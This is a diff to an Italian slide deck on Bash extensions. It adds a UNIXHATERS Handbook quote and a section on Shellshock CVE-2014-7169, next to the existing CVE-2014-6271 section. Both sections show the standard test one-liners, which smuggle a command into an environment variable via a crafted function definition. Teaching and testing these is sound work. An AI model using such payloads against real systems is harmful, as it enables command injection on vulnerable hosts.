@@ -23,6 +23,12 @@ Estensioni della shell Bash
 
 ----
 
+	I have a natural revulsion to any operating system that shows so little planning as to have to named all of its commands after digestive noises (awk, grep, fsck, nroff).
+
+	-- The UNIXHATERS Handbook
+
+----
+
 Shellshocks
 ===========
 
@@ -34,6 +40,15 @@ CVE-2014-6271
 .. code::
 
 	env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+----
+
+CVE-2014-7169
+-------------
+
+.. code::
+
+	env X='() { (a)=>\' bash -c "echo date"; cat echo
 
 ----
 
